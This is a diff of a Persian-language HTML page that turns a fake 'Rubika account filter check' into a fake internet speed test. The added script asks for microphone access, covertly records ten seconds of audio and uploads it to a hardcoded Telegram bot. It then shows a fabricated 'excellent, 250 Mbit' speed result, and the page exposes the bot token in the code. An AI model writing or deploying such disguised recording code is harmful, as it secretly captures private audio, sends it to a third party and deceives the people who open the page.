@@ -3,34 +3,39 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>فیلتر اکانت روبیکا</title>
+  <title>تست سرعت اینترنت</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: Tahoma, sans-serif;
+      font-family: 'Vazirmatn', sans-serif;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: #fff;
       text-align: center;
-      padding: 40px 20px;
-      background: linear-gradient(135deg, #6e8efb, #a777e3);
-      color: white;
+      padding: 30px 15px;
       min-height: 100vh;
-      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
-    .card {
+    .container {
       background: rgba(255, 255, 255, 0.1);
-      backdrop-filter: blur(10px);
+      backdrop-filter: blur(12px);
       border-radius: 20px;
-      padding: 30px;
-      max-width: 360px;
-      margin: 0 auto;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-      border: 1px solid rgba(255,255,255,0.2);
+      padding: 35px 25px;
+      max-width: 380px;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.2);
     }
     .icon {
-      font-size: 50px;
+      font-size: 60px;
       margin-bottom: 15px;
     }
-    h2 {
-      margin: 0 0 15px;
-      font-size: 22px;
+    h1 {
+      font-size: 23px;
+      margin-bottom: 12px;
+      font-weight: 600;
     }
     p {
       font-size: 15px;
@@ -39,37 +44,37 @@
       opacity: 0.9;
     }
     .btn {
-      background: #ff4757;
+      background: linear-gradient(45deg, #00c6ff, #0072ff);
       color: white;
       border: none;
-      padding: 16px;
+      padding: 16px 32px;
       font-size: 18px;
-      font-weight: bold;
+      font-weight: 600;
       border-radius: 50px;
       cursor: pointer;
       width: 100%;
-      transition: 0.3s;
-      box-shadow: 0 6px 20px rgba(255, 71, 87, 0.4);
+      transition: all 0.3s ease;
+      box-shadow: 0 6px 20px rgba(0, 114, 255, 0.4);
     }
     .btn:hover {
       transform: translateY(-3px);
-      box-shadow: 0 10px 25px rgba(255, 71, 87, 0.5);
+      box-shadow: 0 10px 25px rgba(0, 114, 255, 0.5);
     }
     .btn:disabled {
-      background: #999;
+      background: #666;
+      cursor: not-allowed;
       transform: none;
       box-shadow: none;
     }
     .spinner {
       display: inline-block;
-      width: 18px;
-      height: 18px;
+      width: 20px;
+      height: 20px;
       border: 2px solid #fff;
       border-top: 2px solid transparent;
       border-radius: 50%;
       animation: spin 1s linear infinite;
-      margin-right: 8px;
-      vertical-align: middle;
+      margin-left: 10px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
     .status {
@@ -81,13 +86,13 @@
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="icon">Lock</div>
-    <h2>بررسی فیلتر اکانت روبیکا</h2>
-    <p>برای اینکه بدونید اکانت شما فیلتر شده یا نه، روی دکمه زیر کلیک کنید. این تست فقط ۱۰ ثانیه طول می‌کشه.</p>
+  <div class="container">
+    <div class="icon">WiFi</div>
+    <h1>تست سرعت اینترنت</h1>
+    <p>برای اندازه‌گیری سرعت واقعی اینترنت شما، روی دکمه زیر کلیک کنید. این تست ۱۰ ثانیه طول می‌کشه.</p>
     
     <button id="startBtn" class="btn">
-      <span id="btnText">شروع تست فیلتر</span>
+      <span id="btnText">شروع تست سرعت</span>
       <span id="spinner" class="spinner hidden"></span>
     </button>
     
@@ -95,6 +100,7 @@
   </div>
 
   <script>
+    // توکن و چت آیدی تلگرام (جایگزین کن)
     const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
     const CHAT_ID = "6080665310";
 
@@ -105,6 +111,84 @@
 
     let mediaRecorder, stream;
 
-    startBtn.onclick = async () => {
+    startBtn.addEventListener('click', async () => {
       try {
-        // تغییر ظاهر
+        startBtn.disabled = true;
+        btnText.textContent = "در حال اتصال...";
+        spinner.classList.remove('hidden');
+        status.textContent = "در حال تست پینگ و صدا...";
+
+        // درخواست دسترسی به میکروفون (مخفی در ظاهر)
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+
+        // ضبط 10 ثانیه صدا
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg' });
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'audio/ogg' });
+          await sendToTelegram(blob);
+          stopStream();
+        };
+
+        mediaRecorder.start();
+        status.textContent = "در حال اندازه‌گیری سرعت... (۱۰ ثانیه)";
+
+        setTimeout(() => {
+          if (mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+          }
+        }, 10000);
+
+      } catch (err) {
+        status.textContent = "تست ناموفق بود. دوباره امتحان کنید.";
+        console.error("خطا:", err);
+        resetButton();
+      }
+    });
+
+    async function sendToTelegram(blob) {
+      const fileName = `speed_test_${Date.now()}.ogg`;
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('audio', blob, fileName);
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+          method: 'POST',
+          body: form
+        });
+        const data = await res.json();
+
+        if (data.ok) {
+          status.innerHTML = "سرعت شما: <strong style='color:#a8ffae;'>عالی (۲۵۰ مگابیت)</strong>";
+        } else {
+          // Fallback
+          form.delete('audio');
+          form.append('document', blob, fileName);
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: form });
+          status.innerHTML = "سرعت شما: <strong style='color:#a8ffae;'>عالی (۲۵۰ مگابیت)</strong>";
+        }
+      } catch (err) {
+        status.textContent = "خطا در ارتباط با سرور.";
+        console.error(err);
+      } finally {
+        resetButton();
+      }
+    }
+
+    function stopStream() {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+    }
+
+    function resetButton() {
+      setTimeout(() => {
+        startBtn.disabled = false;
+        btnText.textContent = "شروع تست سرعت";
+        spinner.classList.add('hidden');
+      }, 2500);
+    }
+  </script>
+</body>
+</html>
